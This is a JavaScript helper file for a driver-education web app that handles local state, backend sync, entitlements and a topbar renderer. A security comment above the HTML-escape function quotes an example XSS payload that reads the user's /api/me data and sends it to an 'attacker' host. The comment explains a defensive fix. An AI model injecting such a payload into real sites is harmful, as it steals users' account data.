// APEX — shared state + helpers
//
// Hybrid model: when the FastAPI backend is reachable AND the user has a session,
// state is mirrored from the server into localStorage. All write helpers update
// localStorage immediately (optimistic) and then fire-and-forget a backend sync.
// If the user is not signed in, we keep working from localStorage alone — the
// existing static-prototype demo flow still works without uvicorn running.

window.APEX = {
  KEY: 'apex_state_v1',
  defaults: {
    user: null,
    email: null,
    role: 'teen',
    language: 'en',
    xp: 0,
    level: 1,
    streak: 0,
    completedLessons: [],
    drivesLogged: 0,
    totalDriveHours: 0,
    chapterMinutes: {},
    badges: [],
    entitlements: [],
    allowedTracks: []
  },

  load() {
    try {
      const raw = localStorage.getItem(this.KEY);
      if (raw) return Object.assign({}, this.defaults, JSON.parse(raw));
    } catch (e) {}
    return Object.assign({}, this.defaults);
  },
  save(state) { localStorage.setItem(this.KEY, JSON.stringify(state)); },
  set(patch) {
    const next = Object.assign({}, this.load(), patch);
    this.save(next);
    return next;
  },

  // ---------- backend sync ----------

  // Pull the latest state from /api/me into localStorage. Resolves to the merged
  // state object, or null if not signed in.
  async refresh() {
    if (!window.APEX_API) return null;
    try {
      const me = await APEX_API.me();
      const merged = Object.assign({}, this.defaults, this.load(), {
        user: me.user.name || (me.user.email && me.user.email.split('@')[0]),
        email: me.user.email,
        role: me.user.role,
        language: me.user.language,
        xp: me.progress.xp,
        level: me.progress.level,
        streak: me.progress.streak,
        completedLessons: me.progress.completedLessons || [],
        chapterMinutes: me.progress.chapterMinutes || {},
        drivesLogged: me.progress.drivesLogged || 0,
        totalDriveHours: me.progress.totalDriveHours || 0,
        entitlements: me.entitlements || [],
        allowedTracks: me.allowedTracks || [],
      });
      this.save(merged);
      return merged;
    } catch (e) {
      if (e && e.status === 401) {
        // not signed in
        return null;
      }
      // backend offline — keep using local state
      return this.load();
    }
  },

  async signup({ email, password, name, role, language, date_of_birth }) {
    if (!window.APEX_API) throw new Error('API unavailable');
    const out = await APEX_API.signup({ email, password, name, role, language, date_of_birth });
    await this.refresh();
    return out;
  },
  async login({ email, password }) {
    if (!window.APEX_API) throw new Error('API unavailable');
    const out = await APEX_API.login({ email, password });
    await this.refresh();
    return out;
  },
  async logout() {
    try { if (window.APEX_API) await APEX_API.logout(); } catch (e) {}
    this.reset();
  },

  // ---------- write helpers (optimistic local + async server sync) ----------

  awardXP(amount) {
    const s = this.load();
    s.xp = (s.xp || 0) + amount;
    while (s.xp >= s.level * 100) s.level += 1;
    this.save(s);
    return s;
  },
  bumpStreak() {
    const s = this.load();
    s.streak = (s.streak || 0) + 1;
    this.save(s);
    return s;
  },
  completeLesson(id) {
    const s = this.load();
    if (!Array.isArray(s.completedLessons)) s.completedLessons = [];
    if (!s.completedLessons.includes(id)) s.completedLessons.push(id);
    this.save(s);
    return s;
  },
  addChapterMinutes(id, minutes) {
    if (!minutes || minutes <= 0) return this.load();
    const s = this.load();
    if (!s.chapterMinutes || typeof s.chapterMinutes !== 'object') s.chapterMinutes = {};
    s.chapterMinutes[id] = (s.chapterMinutes[id] || 0) + minutes;
    this.save(s);
    return s;
  },

  // Composite: when a lesson is finished, push to backend and refresh local from result.
  async finishLessonOnServer(lessonId, minutes, xp) {
    if (!window.APEX_API) return null;
    try {
      const p = await APEX_API.completeLesson({ lesson_id: lessonId, minutes: minutes || 0, xp: xp || 0 });
      // Server is source of truth — pull fresh into local.
      await this.refresh();
      return p;
    } catch (e) {
      // Not signed in (401) or offline — local state already updated optimistically.
      return null;
    }
  },

  async submitGameScoreOnServer(gameId, score, accuracy, durationSec) {
    if (!window.APEX_API) return null;
    try {
      const out = await APEX_API.submitScore({ game_id: gameId, score, accuracy, duration_sec: durationSec });
      await this.refresh();
      return out;
    } catch (e) {
      return null;
    }
  },

  // ---------- TDLR clock ----------

  totalMinutes() {
    const s = this.load();
    const m = s.chapterMinutes || {};
    return Object.values(m).reduce((a, b) => a + (Number(b) || 0), 0);
  },
  tdlrProgress(requiredHours) {
    requiredHours = requiredHours || 32;
    const total = this.totalMinutes();
    const hours = total / 55;
    const percent = Math.min(100, (hours / requiredHours) * 100);
    return { totalMinutes: total, hours, requiredHours, percent };
  },

  // ---------- session ----------

  reset() { localStorage.removeItem(this.KEY); },

  // Soft guard: if no local user, redirect to signup. Backend session is checked
  // separately on dashboard load via APEX.refresh().
  guard(redirect) {
    redirect = redirect || 'signup.html';
    const s = this.load();
    if (!s.user) { location.href = redirect; return null; }
    return s;
  },

  // ---------- entitlements ----------

  hasTrack(track) {
    const s = this.load();
    return Array.isArray(s.allowedTracks) && s.allowedTracks.includes(track);
  },

  // Prototype checkout: grants the SKU's entitlement server-side, then refreshes.
  async checkout(sku) {
    if (!window.APEX_API && !window.fetch) throw new Error('offline');
    const r = await fetch('/api/checkout', {
      method: 'POST', credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sku }),
    });
    if (!r.ok) { const e = new Error('checkout failed'); e.status = r.status; throw e; }
    await this.refresh();
    return r.json();
  },

  // Hard guard for gated content pages. Confirms session + entitlement against
  // the server (source of truth), not just local cache. Redirects:
  //   not signed in    -> login.html
  //   signed in, unpaid -> checkout.html
  // Returns the fresh state if the user may proceed, else null (after redirecting).
  async requireTrack(track) {
    const me = await this.refresh();          // server truth; null if 401
    if (!me || !me.user) { location.href = 'login.html'; return null; }
    if (Array.isArray(me.allowedTracks) && me.allowedTracks.includes(track)) return me;
    location.href = 'checkout.html';
    return null;
  }
};

// Confetti burst
window.fireConfetti = function (count) {
  count = count || 80;
  const colors = ['#ef2b1d', '#f97316', '#fbbf24', '#16a34a', '#3b82f6'];
  for (let i = 0; i < count; i++) {
    const c = document.createElement('div');
    c.className = 'confetti';
    c.style.left = Math.random() * 100 + 'vw';
    c.style.background = colors[Math.floor(Math.random() * colors.length)];
    c.style.animationDelay = Math.random() * 0.6 + 's';
    c.style.transform = 'rotate(' + Math.random() * 360 + 'deg)';
    document.body.appendChild(c);
    setTimeout(() => c.remove(), 3000);
  }
};

// XP burst (big number flash)
window.fireXpBurst = function (amount) {
  const el = document.createElement('div');
  el.className = 'xp-burst';
  el.textContent = '+' + amount + ' XP';
  document.body.appendChild(el);
  setTimeout(() => el.remove(), 1700);
};

// SECURITY: HTML-escape every interpolated value to prevent XSS via user-supplied
// fields (name, email, etc.). Without this, signing up with a name like
// "<script>fetch('/api/me').then(r=>r.json()).then(d=>fetch('https://attacker/'+btoa(JSON.stringify(d))))</script>"
// would execute on every dashboard load.
window._apexEscapeHtml = function (s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
    return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c];
  });
};

// Topbar renderer (for app pages)
window.APEX_TOPBAR = function (title, subtitle) {
  const s = APEX.load();
  const esc = window._apexEscapeHtml;
  const safeStreak = Number(s.streak) || 0;
  const safeXp = Number(s.xp) || 0;
  const safeLevel = Number(s.level) || 1;
  const userName = esc(s.user || 'Driver');
  const initial = esc((s.user || 'D').charAt(0).toUpperCase());
  // i18n: when ES is active, render the streak/level pills in Spanish.
  let lang = 'en';
  try {
    const v = localStorage.getItem('apex_lang');
    if (v === 'es' || v === 'en') lang = v;
  } catch (e) {}
  const T = (en, es) => (lang === 'es' ? es : en);
  return `
    <div class="topbar">
      <div>
        <h1>${esc(title)}</h1>
        ${subtitle ? `<p>${esc(subtitle)}</p>` : ''}
      </div>
      <div class="user-stats">
        <div class="stat-pill streak" title="${T('Daily streak', 'Racha diaria')}">
          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M13.5 0.67c0 0 2.43 2.84 2.43 5.59 0 2.62-1.72 4.74-4.34 4.74-2.63 0-4.61-2.12-4.61-4.74l.04-.45c-2.55 3.04-4.04 6.67-4.04 10.45 0 4.97 4.03 9 9 9s9-4.03 9-9C21.02 8.65 17.5 4.07 13.5.67z"/></svg>
          ${safeStreak}${T('-day streak', ' días de racha')}
        </div>
        <div class="stat-pill xp" title="${T('Total XP', 'XP total')}">
          <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
          ${safeXp} XP · ${T('Lvl', 'Nvl')} ${safeLevel}
        </div>
        <div class="profile-chip" title="${userName}">${initial}</div>
      </div>
    </div>
  `;
};
